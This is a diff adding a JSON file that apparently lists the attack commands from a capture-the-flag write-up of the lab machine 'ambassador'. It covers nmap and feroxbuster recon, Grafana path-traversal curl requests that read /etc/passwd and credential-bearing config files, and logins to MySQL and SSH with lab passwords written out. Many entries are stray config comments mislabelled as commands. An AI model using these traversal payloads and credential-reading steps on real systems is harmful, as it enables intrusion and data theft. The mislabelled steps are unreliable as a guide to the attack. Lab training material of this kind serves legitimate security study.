@@ -1,0 +1,275 @@
+{
+  "target_ip": "10.10.11.183",
+  "os": "linux",
+  "steps": [
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p- --min-rate 10000 10.10.11.183",
+      "action": "nmap_full",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p 22,80,3000,3306 -sCV 10.10.11.183",
+      "action": "nmap_scripts",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "foothold",
+      "section": "Directory Brute Force",
+      "command": "feroxbuster -u http://10.10.11.183",
+      "action": "feroxbuster",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "foothold",
+      "section": "Identify Exploit",
+      "command": "searchsploit grafana",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "foothold",
+      "section": "POC",
+      "command": "curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd",
+      "action": "curl_request",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini",
+      "action": "curl_request",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "#################### Grafana Configuration Example #####################",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "Everything has defaults so you only need to uncomment things you want to",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "change",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "possible values : production, development",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "################################### Paths ####################################",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "Temporary files in `data` directory older than given duration will be removed",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "Directory where grafana can store logs",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "Directory where grafana will automatically scan and look for plugins",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "folder that contains provisioning config files that grafana will apply on startup and while running.",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "################################### Database ####################################",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "You can configure the database connection by specifying type, host, name, user and password",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "as separate properties or as on string using the url properties.",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "Either \"mysql\", \"postgres\" or \"sqlite3\", it's your choice",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "If the password contains # or ; you have to wrap it with triple quotes. Ex \"\"\"#password;\"\"\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "mysql -u root -p -h 10.10.11.183",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "################################### Security ####################################",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "disable creation of admin user on first start of grafana",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "default admin user, created on startup",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "default admin password, can be changed before first start of grafana,  or in profile settings",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "used for signing",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "user",
+      "section": "grafana.ini",
+      "command": "curl --path-as-is -s http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini | grep -v \"^[#;\\[]\" | grep .",
+      "action": "curl_request",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "foothold",
+      "section": "Get mysql.yaml",
+      "command": "curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml",
+      "action": "curl_request",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "foothold",
+      "section": "Connect to MySQL",
+      "command": "mysql -h 10.10.11.183 -u grafana -p'dontStandSoCloseToMe63221!'",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "foothold",
+      "section": "Connect",
+      "command": "echo \"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==\" | base64 -d",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "foothold",
+      "section": "Connect",
+      "command": "sshpass -p 'anEnglishManInNewYork027468' ssh developer@10.10.11.183",
+      "action": "ssh",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "recon",
+      "section": "put-config-in-console.sh",
+      "command": "We use Consul for application config in production, this script will help set the correct values for the app",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "recon",
+      "section": "put-config-in-console.sh",
+      "command": "Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "recon",
+      "section": "Get Token",
+      "command": "We use Consul for application config in production, this script will help set the correct values for the app",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    },
+    {
+      "phase": "recon",
+      "section": "Get Token",
+      "command": "Export MYSQL_PASSWORD before running",
+      "action": "unknown",
+      "target_ip": "10.10.11.183"
+    }
+  ],
+  "total_commands": 37,
+  "actions_used": [
+    "nmap_full",
+    "ssh",
+    "feroxbuster",
+    "curl_request",
+    "nmap_scripts",
+    "unknown"
+  ],
+  "box_name": "ambassador"
+}
